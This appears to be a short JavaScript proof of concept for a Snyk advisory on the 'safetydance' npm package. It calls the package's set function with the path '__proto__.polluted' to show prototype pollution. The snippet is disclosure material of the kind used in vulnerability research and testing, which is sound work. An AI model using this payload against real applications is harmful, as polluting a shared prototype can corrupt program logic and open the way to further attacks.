//https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687
    const safetydance = require('safetydance'); 
    obj = {}
    
    safetydance.set({}, '__proto__.polluted', "yes");
  